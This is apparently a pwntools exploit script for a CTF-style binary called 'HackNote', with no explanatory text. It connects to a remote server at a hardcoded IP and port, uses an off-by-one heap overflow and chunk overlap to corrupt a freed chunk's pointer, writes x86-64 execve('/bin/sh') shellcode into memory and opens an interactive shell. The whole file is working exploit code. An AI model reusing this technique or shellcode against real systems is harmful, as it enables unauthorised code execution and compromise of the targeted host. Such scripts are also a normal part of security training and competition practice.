from pwn import *

context.log_level = 'debug'
context.binary = './HackNote'
elf = ELF('./HackNote')
libc = elf.libc
io = remote('183.129.189.62', '15604')

def new(size, content):
    io.sendlineafter("4. Exit", "1")
    io.sendlineafter("Input the Size:\n", str(size))
    io.sendlineafter("Note:\n", content)

def free(idx):
    io.sendlineafter("4. Exit", "2")
    io.sendlineafter("Note:\n", str(idx))

def edit(idx, content):
    io.sendlineafter("4. Exit", "3")
    io.sendlineafter("of Note:\n", str(idx))
    io.sendlineafter("Note:", content)

new(0x18, 'a' * 0x4)
new(0x38, 'b' * 0x4)
new(0x38, 'c' * 0x4)
new(0x38, 'd' * 0x4)
edit(0, 'a' * 0x18)
edit(0, 'a' * 0x18 + '\xc1')
free(1)
new(0x78, 'e' * 0x4)
free(2)
edit(1, 'a' * 0x38 + p64(0x41) + p64(0x6cb772))
new(0x38, '\n')
shellcode = ""
shellcode += "\x48\x31\xf6\x56\x48"
shellcode += "\xbf\x2f\x62\x69\x6e"
shellcode += "\x2f\x2f\x73\x68\x57"
shellcode += "\x54\x5f\x6a\x3b\x58"
shellcode += "\x99\x0f\x05"
payload = 'a' * 6 + p64(0x6CB788+8) + shellcode
new(0x38, payload)
io.recvuntil("4. Exit\n")
io.sendlineafter("\n", "1")
io.sendlineafter("Input the Size:\n", "1")
io.interactive()
